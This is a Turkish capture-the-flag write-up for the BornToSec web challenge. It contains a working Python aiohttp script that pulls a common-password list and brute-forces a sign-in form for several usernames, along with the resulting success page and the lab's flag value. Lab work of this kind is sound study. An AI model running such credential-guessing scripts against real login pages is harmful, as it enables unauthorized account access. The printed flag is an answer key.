# Brute Force Attack ile Şifreyi Bulduk

Bu projede, bir web uygulamasının şifresini bulmak için brute force saldırı yöntemini kullandık. Bu süreci açıklayan dosyalar ve içerikleri aşağıda listelenmiştir:

- [FLAG.TXT](#file:flag.txt-context)
- [MAIN.PY](#file:main.py-context)
- [SUCCESS_ADMIN_SHADOW.HTML](#file:success_admin_shadow.html-context)

## FLAG.TXT
```plaintext
b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
```

## MAIN.PY
```python
from aiohttp import ClientSSLError, ClientTimeout
import aiohttp
import asyncio

SERVER_ENDPOINT = "http://localhost:8080"
BAD_AUTH_ERROR_IMAGE = '<img src="images/WrongAnswer.gif" alt="">'
RETRY_COUNT = 3
RETRY_DELAY = 3  # saniye
DELAY_BETWEEN_REQUESTS = 2  # saniye

async def retrieve_password_data_set():
    url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt"
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            raw_text_page = await response.text()
            splited_text_page = raw_text_page.split("\n")
            return splited_text_page

def get_endpoint(username, password):
    return f"{SERVER_ENDPOINT}/?page=signin&username={username}&password={password}&Login=Login#"

async def attempt_login(session, username, password, retry_count=RETRY_COUNT, retry_delay=RETRY_DELAY):
    for attempt in range(retry_count):
        try:
            endpoint_to_hit = get_endpoint(username, password)
            # Zaman aşımı 10 saniye olarak ayarlandı
            async with session.get(endpoint_to_hit, timeout=ClientTimeout(total=10)) as response:
                rendered_page = await response.text()
                attempt_failed = BAD_AUTH_ERROR_IMAGE in rendered_page

                if attempt_failed:
                    print(f"BAŞARISIZ kullanıcı adı={username} şifre={password}")
                else:
                    print(f"BAŞARILI kullanıcı adı={username} şifre={password}")
                    print({'rendered_page': rendered_page})
                    print('_' * 10)
                    with open(f"success_{username}_{password}.html", "w") as f:
                        f.write(rendered_page)
                    return True
        except ClientSSLError as e:
            print(f"SSL hatası {attempt + 1}. denemede kullanıcı adı={username} şifre={password}: {e}")
            if attempt < retry_count - 1:
                print(f"{retry_delay} saniye sonra tekrar deneniyor...")
                await asyncio.sleep(retry_delay)
        except Exception as e:
            print(f"Bilinmeyen hata {attempt + 1}. denemede kullanıcı adı={username} şifre={password}: {e}")
            if attempt < retry_count - 1:
                print(f"{retry_delay} saniye sonra tekrar deneniyor...")
                await asyncio.sleep(retry_delay)
        # Her istek arasında gecikme ekle
        await asyncio.sleep(DELAY_BETWEEN_REQUESTS)
    return False

async def main():
    username_collection = [
        "wil", "admin", "user", "root",
        "me", "GetThe",
        "GetTheFlag", "meone", "metwo", "methree",
    ]
    password_collection = await retrieve_password_data_set()
    print("BRUTEFORCE BAŞLIYOR")
    async with aiohttp.ClientSession() as session:
        for password in password_collection:
            tasks = []
            for username in username_collection:
                tasks.append(attempt_login(session, username, password))
            await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
```

## SUCCESS_ADMIN_SHADOW.HTML
```django-html
<!DOCTYPE HTML>
<html>
    <head>
        <title>BornToSec - Web Bölümü</title>
        <meta http-equiv="content-type" content="text/html; charset=utf-8" />
        <meta name="description" content="" />
        <meta name="keywords" content="" />
        <!--[if lte IE 8]><script src="js/html5shiv.js"></script><![endif]-->
        <script src="js/jquery.min.js"></script>
        <script src="js/skel.min.js"></script>
        <script src="js/skel-layers.min.js"></script>
        <script src="js/init.js"></script>
        <noscript>
            <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
            <link rel="icon" type="image/x-icon" href="favicon.ico" />
            <link rel="stylesheet" href="css/skel.css" />
            <link rel="stylesheet" href="css/style.css" />
            <link rel="stylesheet" href="css/style-xlarge.css" />
        </noscript>
    </head>
    <body class="landing">
        <!-- Başlık -->
        <header id="header" >
                                <a href=http://10.0.2.15><img src=http://10.0.2.15/images/42.jpeg height=82px width=82px/></a>
                                <nav id="nav">
                    <ul>
                        <li><a href="index.php">Ana Sayfa</a></li>
                        <li><a href="?page=survey">Anket</a></li>
                        <li><a href="?page=member">Üyeler</a></li>
                    </ul>
                </nav>
            </header>

        <!-- Ana -->
            <section id="main" class="wrapper">
                <div class="container" style="margin-top:75px">
<center><h2 style="margin-top:50px;">Bayrak : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 </h2><br/><img src="images/win.png" alt="" width=200px height=200px></center>				</div>
            </section>
        <!-- Altbilgi -->
            <footer id="footer">
                <div class="container">
                    <ul class="icons">
                        <li><a href="index.php?page=redirect&site=facebook" class="icon fa-facebook"></a></li>
                        <li><a href="index.php?page=redirect&site=twitter" class="icon fa-twitter"></a></li>
                        <li><a href="index.php?page=redirect&site=instagram" class="icon fa-instagram"></a></li>
                    </ul>
                    <ul class="copyright">
                        <a href="?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f"><li>&copy; BornToSec</li></a>
                    </ul>
                </div>
            </footer>
    </body>
</html>
```